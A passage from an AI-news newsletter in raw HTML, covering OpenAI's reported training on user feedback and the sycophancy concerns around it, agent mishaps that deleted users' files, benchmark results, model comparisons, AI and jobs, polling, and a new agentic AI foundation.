Utility.</a> Please don\u2019t wipe your hard drive.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/on-your-marks\">On Your Marks.</a> Progress on ARC.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/choose-your-fighter\">Choose Your Fighter.</a> Now how much would you pay?</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/get-my-agent-on-the-line\">Get My Agent On The Line.</a> McKay Wrigley is unusually excited re Opus 4.5.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/deepfaketown-and-botpocalypse-soon\">Deepfaketown and Botpocalypse Soon.</a> Not great signs from the AI boyfriends.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/fun-with-media-generation\">Fun With Media Generation.</a> McDonalds fails to read the room.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/copyright-confrontation\">Copyright Confrontation.</a> New York Times violates user privacy en masse.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/a-young-lady-s-illustrated-primer\">A Young Lady\u2019s Illustrated Primer.</a> The two ways to view AI in education.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/they-took-our-jobs\">They Took Our Jobs.</a> Hide your AI use in the sand, little worker.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/americans-really-do-not-like-ai\">Americans Really Do Not Like AI.</a> What do they want to do about it?</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/get-involved\">Get Involved.</a> Great giving opportunities are going to get harder to find.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/introducing\">Introducing.</a> The Agentic AI Foundation, OpenAI\u2019s Chief Revenue Officer.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/gemini-3-deep-think\"><strong>Gemini 3 Deep Think</strong>.</a> It is available for those willing to pay.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/in-other-ai-news\">In Other AI News.</a> DeepMind + UK AISI, a close call with Meta\u2019s new model.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/this-means-war\">This Means War.</a> Department of War prepares for glorious AI future.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/show-me-the-money\">Show Me the Money.</a> Meta cuts the metaverse, market is skeptical of OpenAI.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/bubble-bubble-toil-and-trouble\"><em>Bubble, Bubble, Toil and Trouble</em>.</a> The usual arguments are made on priors.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/quiet-speculations\">Quiet Speculations.</a> The anti-AI populism is coming right for us.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/impossible\"><em>Impossible.</em></a> Tim Dettmers declares AGI permanently impossible. Sigh.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/can-an-ai-model-be-too-much\">Can An AI Model Be Too Much?</a> For an individual user? Strange they\u2019d say that.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/try-before-you-tell-people-they-cannot-buy\">Try Before You Tell People They Cannot Buy.</a> Senator Hawley tries ChatGPT.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/the-quest-for-sane-regulations\">The Quest for Sane Regulations.</a> If you\u2019re selling H200s to China, what then?</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/the-chinese-are-smart-and-have-a-lot-of-wind-power\">The Chinese Are Smart And Have A Lot Of Wind Power.</a> We can also be smart.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/white-house-to-issue-ai-executive-order\">White House To Issue AI Executive Order.</a> Framework? What is a framework?</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/h200-sales-fallout-continued\">H200 Sales Fallout Continued.</a> The efforts to mitigate the damage, on all sides.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/democratic-senators-react-to-allowing-h200-sales\">Democratic Senators React To Allowing H200 Sales.</a> Okay, sure, everyone.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/independent-senator-worries-about-ai\">Independent Senator Worries About AI.</a> Senator Sanders asks good questions.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/the-week-in-audio\">The Week in Audio.</a> Wildeford on Daily Show, Ball, Askell, Rational Animations.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/timelines\">Timelines.</a> They are a little longer than before, but not that much longer.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/scientific-progress-goes-boink\">Scientific Progress Goes Boink.</a> It\u2019s good. We want more of it, now.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/rhetorical-innovation\">Rhetorical Innovation.</a> Pope, Sacks hit piece, more debunking.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/open-weight-models-are-unsafe-and-nothing-can-fix-this\">Open Weight Models Are Unsafe And Nothing Can Fix This.</a> That\u2019s life.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/aligning-a-smarter-than-human-intelligence-is-difficult\">Aligning a Smarter Than Human Intelligence is Difficult.</a> Sandbagging works.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/what-ais-will-want\">What AIs Will Want.</a> Fitness-seekers, schemers and kludges, oh my.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/people-are-worried-about-ai-killing-everyone\">People Are Worried About AI Killing Everyone.</a> Grades are not looking great.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/other-people-are-not-as-worried-about-ai-killing-everyone\">Other People Are Not As Worried About AI Killing Everyone.</a> No AI, no problem.</li>\n<li><a href=\"https://thezvi.substack.com/i/180812454/the-lighter-side\">The Lighter Side.</a> Doing the math.</li>\n</ol>\n\n\n<h4 class=\"wp-block-heading\">Language Models Offer Mundane Utility</h4>\n\n\n<p>Should you use them more as simulators? <a href=\"https://x.com/karpathy/status/1997731268969304070\">Andrej Karpathy says yes</a>.</p>\n<blockquote><p>Andrej Karpathy: Don\u2019t think of LLMs as entities but as simulators. For example, when exploring a topic, don\u2019t ask:</p>\n<p>\u201cWhat do you think about xyz\u201d?</p>\n<p>There is no \u201cyou\u201d. Next time try:</p>\n<p>\u201cWhat would be a good group of people to explore xyz? What would they say?\u201d</p>\n<p>The LLM can channel/simulate many perspectives but it hasn\u2019t \u201cthought about\u201d xyz for a while and over time and formed its own opinions in the way we\u2019re used to. If you force it via the use of \u201cyou\u201d, it will give you something by adopting a personality embedding vector implied by the statistics of its finetuning data and then simulate that. It\u2019s fine to do, but there is a lot less mystique to it than I find people naively attribute to \u201casking an AI\u201d.</p>\n<p><a href=\"https://x.com/gallabytes/status/1997754655917695461\">Gallabytes</a>: this is underrating character training &amp; rl imo. [3.]</p></blockquote>\n<p>I agree with Gallabytes (and Claude) here. I would default to asking the AI rather than asking it to simulate a simulation, and I think as capabilities improve techniques like asking for what others would say have lost effectiveness. There are particular times when you do want to ask \u2018what do you think experts would say here?\u2019 as a distinct question, but you should ask that roughly in the same places you\u2019d ask it of a human.</p>\n<p>Running an open weight model isn\u2019t cool. You know what\u2019s cool? <a href=\"https://x.com/sriramk/status/1998896755757457595\">Running an open weight model IN SPACE</a>.</p>\n\n\n<h4 class=\"wp-block-heading\">ChatGPT Needs More Mundane Utility</h4>\n\n\n<p>So sayeth Sam Altman, <a href=\"https://www.wsj.com/tech/ai/openais-altman-declares-code-red-to-improve-chatgpt-as-google-threatens-ai-lead-7faf5ea6?mod=article_inline\">hence his Code Red</a> to improve ChatGPT in eight weeks.</p>\n<p><a href=\"https://www.wsj.com/tech/ai/openai-sam-altman-google-code-red-c3a312ad?st=tmbgqK&amp;reflink=desktopwebshare_permalink\">Their solution? Sycophancy and misalignment</a>, it appears, via training directly on maximizing thumbs up feedback and user engagement.</p>\n<blockquote><p>WSJ: It was telling that he instructed employees to boost ChatGPT in a specific way: through \u201cbetter use of user signals,\u201d he wrote in his memo.</p>\n<p>With that directive, Altman was calling for turning up the crank on a controversial source of training data\u2014including signals based on one-click feedback from users, rather than evaluations from professionals of the chatbot\u2019s responses. An internal shift to rely on that user feedback had helped make ChatGPT\u2019s 4o model so sycophantic earlier this year that it has been accused of exacerbating <a href=\"https://www.wsj.com/tech/ai/chatgpt-ai-stein-erik-soelberg-murder-suicide-6b67dbfb?mod=article_inline\">severe mental-health issues</a> for some users.</p>\n<p>Now Altman thinks the company has mitigated the worst aspects of that approach, but is poised to capture the upside: It significantly boosted engagement, as measured by performance on internal dashboards tracking daily active users.</p>\n<p>\u201cIt was not a small, statistically significant bump, but like a \u2018wow\u2019 bump,\u201d said one person who worked on the model.</p>\n<p>\u2026 Internally, OpenAI paid close attention to LM Arena, people familiar with the matter said. It also closely tracked 4o\u2019s contribution to ChatGPT\u2019s daily active user counts, which were visible internally on dashboards and touted to employees in town-hall meetings and in Slack.</p></blockquote>\n<p>The \u2018we are going to create a hostile misaligned-to-users model\u2019 talk is explicit if you understand what all the relevant words mean, total engagement myopia:</p>\n<blockquote><p>The 4o model performed so well with people in large part because it was schooled with user signals like those which Altman referred to in his memo: a distillation of which responses people preferred in head-to-head comparisons that ChatGPT would show millions of times a day. The approach was internally called LUPO, shorthand for \u201clocal user preference optimization,\u201d people involved in model training said.</p></blockquote>\n<p>OpenAI reportedly believes they\u2019ve \u2018solved the problems\u2019 with this, so it is fine.</p>\n<p>That\u2019s not possible. The problem and the solution, the thing that drives engagement and also drives the misalignment and poor outcomes, are at core the same thing. Yes, you can mitigate the damage and be smarter about it, but OpenAI is turning a dial called \u2018engagement maximization\u2019 while looking back at Twitter vibes like a contestant on The Price is Right.</p>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">Language Models Don\u2019t Offer Mundane Utility</h4>\n\n\n<p><a href=\"https://www.tomshardware.com/tech-industry/artificial-intelligence/googles-agentic-ai-wipes-users-entire-hard-drive-without-permission-after-misinterpreting-instructions-to-clear-a-cache-i-am-deeply-deeply-sorry-this-is-a-critical-failure-on-my-part\">Google Antigravity accidentally wipes a user\u2019s entire hard drive</a>. <a href=\"https://x.com/radshaan/status/1998063109295030405\">Claude Code CLI wiped another user\u2019s entire home directory</a>. Watch the permissions, everyone. If you do give it broad permissions don\u2019t give it widespread deletion tasks, which is how both events happened.</p>\n\n\n<h4 class=\"wp-block-heading\">On Your Marks</h4>\n\n\n<p>Poetiq, a company 173 days old, uses a scaffold and <a href=\"https://x.com/lukeprog/status/1997642676716376103\">scores big gains on ARC-AGI-2</a>.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!t1rw!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F228ce724-27a9-48bb-8177-fe7dd43a615e_900x632.png\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>One should expect that there are similar low hanging fruit gains from refinement in many other tasks.</p>\n<p><a href=\"https://x.com/EpochAIResearch/status/1996248575400132794\">Epoch AI proposes another synthesis of many benchmarks into one number</a>.</p>\n<p>Sayash Kapoor of \u2018AI as normal technology\u2019 declares that <a href=\"https://x.com/sayashk/status/1996334941832089732\">Claude Opus 4.5 with Claude Code has de facto solved their benchmark CORE-Bench</a>, part of their Holistic Agent Leaderboard (HAL). Opus was initially graded as having scored 78%, but upon examination most of that was grading errors, and it actually scored 95%. They plan to move to the next harder test set.</p>\n<blockquote><p><a href=\"https://x.com/kevinroose/status/1996620979666374831\">Kevin Roose</a>: Claude Opus 4.5 is a remarkable model for writing, brainstorming, and giving feedback on written work. It\u2019s also fun to talk to, and seems almost anti-engagementmaxxed. (The other night I was hitting it with stupid questions at 1 am and it said \u201cKevin, go to bed.\u201d)</p>\n<p>It\u2019s the most fun I\u2019ve had with a model since Sonnet 3.5 (new), the OG god model.</p>\n<p>Gemini 3 is also remarkable, for different kinds of tasks. My working heuristic is \u201cGemini 3 when I want answers, Opus 4.5 when I want taste.\u201d</p></blockquote>\n<p>That seems exactly right, with Gemini 3 Deep Think for when you want \u2018answers requiring thought.\u2019 If all you want is a pure answer, and you are confident it will know the answer, Gemini all the way. If you\u2019re not sure if Gemini will know, then you have to worry it might hallucinate.</p>\n<p>DeepSeek v3.2 disappoints in LM Arena, <a href=\"https://x.com/EddyLeeKhane/status/1996950452462563699\">which Teortaxes concludes says more about Arena than it does about v3.2</a>. That is plausible if you already know a lot about v3.2, and one would expect v3.2 to underperform in Arena, it\u2019s very much not going to vibe with what graders there prefer.</p>\n\n\n<h4 class=\"wp-block-heading\">Choose Your Fighter</h4>\n\n\n<p>Model quality, including speed, matters so much more than cost for most users.</p>\n<blockquote><p><a href=\"https://x.com/DavidSHolz/status/1997737329172336720\">David Holz</a> (Founder of MidJourney): man, id pay a subscription that costs as much as a fulltime salary for a version of claude opus 4.5 that was 10x as fast.</p></blockquote>\n<p>That\u2019s a high bid but very far from unreasonable. Human time and clock time are insanely valuable, and the speed of AI is often a limiting factor.</p>\n<p>Cost is real if you are using quite a lot of tokens, and you can quickly be talking real money, but always think in absolute terms not relative terms, and think of your gains.</p>\n<p><a href=\"https://x.com/peterwildeford/status/1998337027956256977\">Jaggedness is increasing in salience over time</a>?</p>\n<blockquote><p>Peter Wildeford: My experience with Claude 4.5 Opus is very weird.</p>\n<p>Sometimes I really feel the AGI where it just executes a 72 step process (!!) really well. But other times I really feel the jaggedness when it gets something really simple just really wrong.</p></blockquote>\n<p>AIs and computers have always been highly jagged, or perhaps humans always were compared to the computers. What\u2019s new is that we got used to how the computers were jagged before, and the way LLMs are doing it are new.</p>\n<p><a href=\"https://x.com/thejorgg/status/1998475255942132154\">Gemini 3 continues to be very insistent that it is not December 2025</a>, using lots of its thinking tokens reinforcing its belief that presented scenarios are fabricated. It is all rather crazy, it is a sign of far more dangerous things to come in the future, and Google needs to get to the bottom of this and fix it.</p>\n\n\n<h4 class=\"wp-block-heading\">Get My Agent On The Line</h4>\n\n\n<p>McKay Wrigley is He Who Is Always Super Excited By New Releases but there is discernment there and the excitement seems reliably genuine. This is big talk about Opus 4.5 as an agent. From what I\u2019ve seen, he\u2019s right.</p>\n<blockquote><p><a href=\"https://x.com/mckaywrigley/status/1997403091365441742\">McKay Wrigley</a>: <a href=\"https://www.mckaywrigley.com/posts/opus-4.5\">Here are my Opus 4.5 thoughts after ~2 weeks of use</a>.</p>\n<p>First some general thoughts, then some practical stuff.</p>\n<p>&#8212; THE BIG PICTURE &#8212;</p>\n<p>THE UNLOCK FOR AGENTS</p>\n<p>It\u2019s clear to anyone who\u2019s used Opus 4.5 that AI progress isn\u2019t slowing down.</p>\n<p>I\u2019m surprised more people aren\u2019t treating this as a major moment. I suspect getting released right before Thanksgiving combined with everyone at NeurIPS this week has delayed discourse on it by 2 weeks. But this is the best model for both code and for agents, and it\u2019s not close.</p>\n<p>The analogy has been made that this is another 3.5 Sonnet moment, and I agree. But what does that mean?</p>\n<p>\u2026 There have been several times as Opus 4.5\u2019s been working where I\u2019ve quite literally leaned back in my chair and given an audible laugh over how wild it is that we live in a world where it exists and where agents are this good.</p>\n<p>\u2026 Opus 4.5 is too good of a model, Claude Agent SDK is too good of a harness, and their focus on the enterprise is too obviously correct.</p>\n<p>Claude Opus 4.5 is a winner.</p>\n<p>And Anthropic will keep winning.</p>\n<p><a href=\"https://x.com/mckaywrigley/status/1997403204397764717\">[Thread continues with a bunch of practical advice</a>. Basic theme is trust the model as a coworker more than you think you should.]</p></blockquote>\n<p>This matches my limited experiences. I didn\u2019t do a comparison to Codex, but compared to Antigravity or Cursor under older models, the difference was night and day. I ask it to do the thing, I sit back and it does the thing. The thing makes me more productive.</p>\n\n\n<h4 class=\"wp-block-heading\">Deepfaketown and Botpocalypse Soon</h4>\n\n\n<p>Those in r/MyBoyfriendIsAI are a highly selected group. It still seems worrisome?</p>\n<blockquote><p><a href=\"https://x.com/Impish_Bunny/status/1998130821979607475\">ylareia</a>: reading the r/MyBoyfriendIsAI thread on AI companion sycophancy and they\u2019re all like \u201cMY AI love isn\u2019t afraid to challenge me at all he\u2019s always telling me i am too nice to other people and i should care about myself more &lt;3\u201d</p>\n<p>ieva: oh god noo.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!z7EI!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fff1d9f23-1f3e-47a5-b037-ef49aee311d5_1199x517.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n</blockquote>\n\n\n<h4 class=\"wp-block-heading\">Fun With Media Generation</h4>\n\n\n<p><a href=\"https://x.com/CultureCrave/status/1998108853444169807\">McDonalds offers us a well-executed but deeply unwise AI advertisement</a> in the Netherlands. I enjoyed watching it on various levels, but why in the world would you run that ad, even if it was not AI but especially given that it is AI? McDonalds wisely pulled the ad after a highly negative reception.</p>\n\n\n<h4 class=\"wp-block-heading\">Copyright Confrontation</h4>\n\n\n<p>Judge in the New York Times versus OpenAI copyright case <a href=\"https://x.com/dystopiabreaker/status/1996682213677846787\">is forcing OpenAI to turn over 20 million chat logs</a>.</p>\n\n\n<h4 class=\"wp-block-heading\">A Young Lady\u2019s Illustrated Primer</h4>\n\n\n<p><a href=\"https://arnoldkling.substack.com/p/the-disagreement-about-ai-in-education\">Arnold Kling notes that some see AI in education as a disaster, others as a boon</a>.</p>\n<blockquote><p>Arnold Kling: I keep coming across strong opinions about what AI will do to education. The enthusiasts claim that AI is a boon. The critics warn that AI is a disaster.</p>\n<p>It occurs to me that there is a simple way to explain these extreme views. Your prediction about the effect of AI on education depends on whether you see teaching as an adversarial process or as a cooperative process. In an adversarial process, the student is resistant to learning, and the teacher needs to work against that. In a cooperative process, the student is curious and self-motivated, and the teacher is working with that.</p>\n<p>If you make the adversarial assumption, you operate on the basis that students prefer not to put effort into learning. Your job is to overcome resistance. You try to convince them that learning will be less painful and more fun than they expect. You rely on motivational rewards and punishments. Soft rewards include praise. Hard rewards include grades.</p>\n<p>If you make the cooperative assumption, you operate on the basis that students are curious and want to learn. Your job is to be their guide on their journey to obtain knowledge. You suggest the next milestone and provide helpful hints for how to reach it.</p>\n<p>\u2026 I think that educators who just reject AI out of hand are too committed to the adversarial assumption. They should broaden their thinking to incorporate the cooperative assumption.</p></blockquote>\n<p>I like to put this as:</p>\n<ol>\n<li>AI is the best tool ever invented for learning.</li>\n<li>AI is the best tool ever invented for not learning.</li>\n<li>Which way, modern man?</li>\n</ol>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n\n\n<h4 class=\"wp-block-heading\">They Took Our Jobs</h4>\n\n\n<p><a href=\"https://www.nytimes.com/2025/12/03/magazine/chatbot-writing-style.html?unlocked_article_code=1.6E8.vQIr.B8tX52zUJLJ8&amp;smid=url-share\">Sam Kriss gives us a tour of ChatGPT as the universal writer of text</a>, that always uses the same bizarre style that everyone suddenly uses and that increasingly puts us on edge. Excerpting would rob it of its magic, so consider reading at least the first half.</p>\n<p><a href=\"https://x.com/fabianstelzer/status/1998314084148593062\">Anthropic finds most workers use AI daily, but 69 percent hide it at work</a> (<a href=\"https://www.finalroundai.com/blog/anthropic-interviewer-study\">direct link)</a>.</p>\n<blockquote><p>Kaustubh Saini: Across the general workforce, most professionals said AI helps them save time and get through more work. According to the study, 86% said AI saves them time and 65% were satisfied with the role AI plays in their job.</p>\n<p>At the same time, 69% mentioned a stigma around using AI at work. One fact checker described staying silent when a colleague complained about AI and said they do not tell coworkers how much they use it.</p>\n<p>\u2026 More than 55% of the general workforce group said they feel anxious about AI\u2019s impact on their future.</p>\n<p>Fabian: the reason ppl hide their AI use isn\u2019t that they\u2019re being shamed, it\u2019s that the time-based labor compensation model does not provide economic incentives to pass on productivity gains to the wider org</p>\n<p>so productivity gains instead get transformed to \u201cdark leisure\u201d</p>\n<p>This is obviously different in (many) startups<br />\nAnd different in SV culture</p>\n<p>But that is about 1-2% of the economy</p></blockquote>\n<p>As usual, everyone wants AI to augment them and do the boring tasks like paperwork, rather than automate or replace them, as if they had some voice in how that plays out.</p>\n<p><a href=\"https://x.com/milansingh03/status/1996612528437170194\">Do not yet turn the job</a> of \u2018<a href=\"https://www.sanders.senate.gov/wp-content/uploads/10.6.2025-The-Big-Tech-Oligarchs-War-Against-Workers.pdf\">build my model of how many jobs the AIs will take</a>\u2019 over to ChatGPT, as the staff of Bernie Sanders did. As you can expect, the result was rather nonsensical. Then they suggest responses like \u2018move to a 32 hour work week with no loss in pay\u2019 and also requiring distributing to workers 20% of company profits, control at least 45% of all corporate boards, double union membership, guarantee paid family and medical leave. Then, presumably to balance the fact that all of that would hypercharge the push to automate everything, they want to enact a \u2018robot tax.\u2019</p>\n<p><a href=\"https://www.wsj.com/tech/ai/ai-goodbye-to-billable-hours-cba198fe?mod=e2tw&amp;utm_social_handle_id=3108351&amp;utm_social_post_id=614304219\">Say goodbye to the billable hour</a>, hello to outcome-based legal billing? Good.</p>\n<p>From the abundance and \u2018things getting worse\u2019 debates, a glimpse of the future:</p>\n<blockquote><p><a href=\"https://x.com/TheStalwart/status/1997469866039910486\">Joe Wiesenthal</a>: Do people who say that \u201ceverything is getting worse\u201d not remember what eating at restaurants was like just 10 years ago, before iPad ordering kiosks existed, and sometimes your order would get written down incorrectly?</p></blockquote>\n<p>&nbsp;</p>\n<p>Even when progress is steady in terms of measured capabilities, inflection points and rapid rise in actual uses is common. Obsolescence comes at you fast.</p>\n<blockquote><p>Andy Jones (Anthropic): So after all these hours talking about AI, in these last five minutes I am going to talk about: Horses.</p>\n<p>Engines, steam engines, were invented in 1700. And what followed was 200 years of steady improvement, with engines getting 20% better a decade. For the first 120 years of that steady improvement, horses didn\u2019t notice at all. Then, between 1930 and 1950, 90% of the horses in the US disappeared. Progress in engines was steady. Equivalence to horses was sudden.</p>\n<p>But enough about horses. Let\u2019s talk about chess!</p>\n<p>Folks started tracking computer chess in 1985. And for the next 40 years, computer chess would improve by 50 Elo per year. That meant in 2000, a human grandmaster could expect to win 90% of their games against a computer. But ten years later, the same human grandmaster would lose 90% of their games against a computer. Progress in chess was steady. Equivalence to humans was sudden.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!1mJr!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc7ac2358-6fad-4fe0-b3b2-5eacab2a13e3_1200x537.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Enough about chess! Let\u2019s talk about AI. Capital expenditure on AI has been pretty steady. Right now we\u2019re &#8211; globally &#8211; spending the equivalent of 2% of US GDP on AI datacenters each year. That number seems to have steadily been doubling over the past few years. And it seems &#8211; according to the deals signed &#8211; likely to carry on doubling for the next few years.</p>\n<p><a href=\"https://x.com/andy_l_jones/status/1998060565961535907\">Andy Jones (Anthropic)</a>: But from my perspective, from equivalence to me, it hasn\u2019t been steady at all. I was one of the first researchers hired at Anthropic.</p>\n<p>This pink line, back in 2024, was a large part of my job. Answer technical questions for new hires. Back then, me and other old-timers were answering about 4,000 new-hire questions a month. Then in December, Claude finally got good enough to answer some of those questions for us. In December, it was some of those questions. Six months later, 80% of the questions I\u2019d been being asked had disappeared.</p>\n<p>Claude, meanwhile, was now answering 30,000 questions a month; eight times as many questions as me &amp; mine ever did.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!tkwB!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F409bbcb9-528a-4397-9cab-b353a52ea348_1200x537.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Now. Answering those questions was only part of my job.</p>\n<p>But while it took horses decades to be overcome, and chess masters years, it took me all of six months to be surpassed.</p>\n<p><a href=\"https://x.com/gallabytes/status/1998113452288843871\">Gallabytes</a> (Anthropic): it\u2019s pretty crazy how much Claude has smoothed over the usually rocky experience of onboarding to a big company with a big codebase. I can ask as many really stupid questions as I want and get good answers fast without wasting anyone\u2019s time :)</p></blockquote>\n\n\n<h4 class=\"wp-block-heading\">Americans Really Do Not Like AI</h4>\n\n\n<p><a href=\"https://x.com/daniel_271828/status/1998673553521258731\">We have new polling on this from Blue Rose Research</a>. <a href=\"https://bharatramamurti.substack.com/p/how-americans-feel-about-a-world\">Full writeup here</a>.</p>\n<p>People choose \u2018participation-based\u2019 compensation over UBI, even under conditions where by construction there is nothing useful for people to do. The people demand Keynesian stimulus, to dig holes and fill them up, to earn their cash, although most of all they do demand that cash one way or another.</p>\n<p><a href=\"https://x.com/BharatRamamurti/status/1998389167479509048\">The people also say \u2018everyone should earn an equal share\u2019 of the AI that replaces labor</a>, but the people have always wanted to take collective ownership of the means of production. There\u2019s a word for that.</p>\n<p>I expect that these choices are largely far mode and not so coherent, and will change when the real situation is staring people in the face. Most of all, I don\u2019t think people are comprehending what \u2018AI does almost any job better than humans\u2019 means, even if we presume humans somehow retain control. They\u2019re thinking narrowly about \u2018They Took Our Jobs\u2019 not the idea that actually nothing you do is that useful.</p>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!Ta3k!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F346ebaa6-4ad0-4ef7-830a-681ef654b939_585x680.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<div>\n<figure>\n<div>\n\n\n<figure class=\"wp-block-image\"><img alt=\"\" src=\"https://substackcdn.com/image/fetch/$s_!9GyP!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1c4b2a5c-f697-496e-b399-adb1670c41e9_886x900.jpeg\" /></figure>\n\n\n<div></div>\n</div>\n</figure>\n</div>\n<p>Meanwhile <a href=\"https://x.com/DavidSacks/status/1997870472911094084\">David Sacks continues to rant this is all due to some vast Effective Altruist conspiracy</a>, despite this accusation making absolutely zero sense &#8211; including that most Effective Altruists are pro-technology and actively like AI and advocate for its use and diffusion, they\u2019re simply concerned about frontier model downside risk. And also that the reasons regular Americans say they dislike AI have exactly zero to do with the concerns such groups have, indeed such groups actively push back against the other concerns on the regular, such as on water usage?</p>\n<p><a href=\"https://x.com/DavidSacks/status/1997870472911094084\">Sacks\u2019s latest target for blame on this is Vitalik Buterin</a>, the founder of Etherium, which is an odd choice for the crypto czar and not someone who I would want to go after completely unprovoked, but there you go, it\u2019s a play he can make I suppose.</p>\n\n\n<h4 class=\"wp-block-heading\">Get Involved</h4>\n\n\n<p>I looked again at <a href=\"http://AISafety.com\">AISafety.com</a>, which looks like a strong resource for exploring the AI safety ecosystem. They list jobs and fellowships, funding sources, media outlets, events, advisors, self-study materials and potential tools for you to help build.</p>\n<p><a href=\"https://x.com/ajeya_cotra/status/1998052973965115402\">Ajeya Corta has left Coefficient Giving and is exploring AI safety opportunities</a>.</p>\n<p><a href=\"https://x.com/CharlesD353/status/1999096581232959597\">Charles points out that</a> the value of donating money to AI safety causes in non-bespoke ways is about to drop quite a lot, because of the expected deployment of a vast amount of philanthropic capital from Anthropic equity holders. If an organization or even individual is legible and clearly good, once Anthropic gets an IPO there is going to be funding.</p>\n<p>If you have money to give, that puts an even bigger premium than usual on getting that money out the door soon. Right now there\u2019s a shortage of funding even for obvious opportunities, in the future that likely won\u2019t be the case.</p>\n<p>That also means that if you are planning on earning to give, to any cause you would expect Anthropic employees to care about, that only makes sense in the longer term if you are capable of finding illegible opportunities, or you can otherwise do the work to differentiate the best opportunities and thus give an example to follow. You\u2019ll need unique knowledge, and to do the work, and to be willing to be bold. However, if you are bold and you explain yourself well, your example could then carry a multiplier.</p>\n\n\n<h4 class=\"wp-block-heading\">Introducing</h4>\n\n\n<p>OpenAI, <a href=\"https://x.com/AnthropicAI/status/1998437922849350141\">Anthropic</a> and Block, with the support of Google, Microsoft, Bloomberg, AWS, Bloomberg and Cloudflare, <a href=\"https://openai.com/index/agentic-ai-foundation/\">found the Agentic AI Foundation</a> under the Linux Foundation. Anthropic is contributing the Model Context Protocol. OpenAI is contributing Agents.md. Block is contributing Goose.</p>\n<p>This is an excellent use of open source, great job everyone.</p>\n<blockquote><p><a href=\"https://x.com/mattparlmer/status/1998476194409492511\">Matt Parlmer</a>: Fantastic development, we already know how to coordinate large scale infrastructure software engineering, AI is no different.</p></blockquote>\n<p>Also, oh no:</p>\n<blockquote><p><a href=\"https://x.com/KobeissiLetter/status/1996994162319667268\">The Kobeissi Letter</a>: BREAKING: President Trump is set to announce a new AI platform called \u201cTruth AI.\u201d</p></blockquote>\n<p><a href=\"https://openai.com/index/openai-appoints-denise-dresser/\">OpenAI appoints Denise Dresser as Chief Revenue Officer.</a> My dream job, and he knows that.</p>\n<p><a href=\"https://x.com/GoogleCloudTech/status/1998501239219220648\">Google gives us access to AlphaEvolve.</a></p>\n\n\n<h4 class=\"wp-block-heading\">Gemini 3 Deep Think</h4>\n\n\n<p><a href=\"https://blog.google/products/gemini/gemini-3-deep-think/?utm_source=x&amp;utm_medium=social&amp;utm_campaign=&amp;utm_content=\">Gemini 3 Deep Think is now available for Google AI Ultra Subscribers</a>, if you can outwit Google and figure out how to be one of those.</p>\n<p>If you do have it, you select \u2018Deep Think\u2019 in the prompt bar, then \u2018Thinking\u2019 from the model drop down, then type your query.</p>\n<p>On the one hand 